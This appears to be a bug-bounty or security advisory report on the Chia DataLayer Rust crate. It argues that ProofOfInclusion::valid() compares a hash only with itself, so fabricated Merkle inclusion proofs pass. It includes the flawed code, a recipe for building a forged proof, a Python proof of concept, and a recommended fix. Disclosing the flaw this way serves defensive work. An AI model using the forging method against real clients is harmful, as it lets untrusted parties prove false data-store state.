### Title
DataLayer `ProofOfInclusion::valid()` Tautological Root-Hash Check Enables Forged Inclusion Proofs — (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary
The `ProofOfInclusion::valid()` method in the DataLayer Merkle implementation only verifies internal hash-chain consistency. Its final assertion — `existing_hash == self.root_hash()` — is a tautology: after the loop, `existing_hash` is always equal to `last.combined_hash`, which is exactly what `root_hash()` returns. No external trusted root hash is ever compared. An unprivileged attacker can craft a `ProofOfInclusion` with an arbitrary `node_hash` (claiming any key→value mapping) and internally consistent `combined_hash` values that will pass `valid()` unconditionally, letting untrusted input prove invalid DataLayer state.

### Finding Description

**Root cause — `valid()` in `proof_of_inclusion.rs`:**

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;          // attacker-controlled

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,                       // attacker-controlled
        );
        if calculated_hash != layer.combined_hash {  // attacker sets combined_hash = calculated_hash
            return false;
        }
        existing_hash = calculated_hash;
    }

    existing_hash == self.root_hash()                // TAUTOLOGY: root_hash() == last.combined_hash
}
```

`root_hash()` is:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash          // same value as existing_hash after the loop
    } else {
        self.node_hash
    }
}
```

After the loop, `existing_hash` holds the last `combined_hash`. `root_hash()` also returns the last `combined_hash`. The final comparison is therefore always `true` if the loop completes. The method never compares against any externally trusted root.

**Attacker-controlled entry path:**

`ProofOfInclusion` derives `Streamable` and is exposed through the Python wheel via `from_bytes`, `from_bytes_unchecked`, and `parse_rust`. Any peer or API caller can supply a crafted serialized proof. The `calculate_internal_hash` / `internal_hash` functions are public, so the attacker can compute correct `combined_hash` values for any chosen `node_hash` and `other_hash` inputs.

**Exploit construction:**

Choose any target `node_hash` H₀ (e.g., the hash of a fake leaf asserting key K → value V). Pick arbitrary sibling hashes H₁, H₂, … and compute:

```
combined_hash[0] = internal_hash(H₀, H₁)   // or internal_hash(H₁, H₀) per chosen side
combined_hash[1] = internal_hash(combined_hash[0], H₂)
...
```

The resulting `ProofOfInclusion` passes `valid()` for any `node_hash` the attacker desires, with no knowledge of the real tree.

### Impact Explanation

A caller that receives a `ProofOfInclusion` over the network (or from any untrusted source), deserializes it, and calls `proof.valid()` will receive `true` for a completely fabricated proof. The attacker can assert that any key is present in the DataLayer tree with any value, and the proof will be accepted. This directly satisfies the allowed impact: **DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion and lets untrusted input prove invalid state.**

### Likelihood Explanation

`ProofOfInclusion` is a `Streamable` type exposed through the Python wheel (`from_bytes`, `parse_rust`) and is the canonical proof object returned by `MerkleBlob::get_proof_of_inclusion`. Any DataLayer client that receives a proof from a peer and calls `proof.valid()` — the only validation method provided — is vulnerable. No privileged access is required; any network peer can send a crafted proof.

### Recommendation

`valid()` must accept a trusted root hash and compare against it:

```rust
pub fn valid_against_root(&self, trusted_root: &Hash) -> bool {
    // existing chain-consistency loop ...
    existing_hash == *trusted_root   // compare against externally trusted root
}
```

Alternatively, rename the current method to `is_internally_consistent()` and add a separate `verify(trusted_root: &Hash) -> bool` that performs the complete check. The tautological final line `existing_hash == self.root_hash()` should be replaced with a comparison against the caller-supplied trusted root.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer, Side
from chia_rs.sized_bytes import bytes32
import hashlib

# Attacker-chosen node hash (fake leaf)
node_hash = bytes32(b'\xAB' * 32)

# Compute a valid combined_hash for one layer
other_hash = bytes32(b'\xCD' * 32)
combined = hashlib.sha256(b'\x02' + node_hash + other_hash).digest()

layer = ProofOfInclusionLayer(
    other_hash_side=Side.Right,   # node_hash on left
    other_hash=bytes32(other_hash),
    combined_hash=bytes32(combined),
)

forged_proof = ProofOfInclusion(node_hash=node_hash, layers=[layer])

# valid() returns True for a completely fabricated proof
assert forged_proof.valid(), "Expected True — forged proof accepted"
# root_hash() is the attacker-chosen combined value, not any real tree root
print("Forged root:", forged_proof.root_hash().hex())
```

pub fn internal_hash(left_hash: &Hash, right_hash: &Hash) -> Hash {
    let mut hasher = Sha256::new();
    hasher.update(b"\x02");
    hasher.update(left_hash.0);
    hasher.update(right_hash.0);

    Hash(Bytes32::new(hasher.finalize()))
}
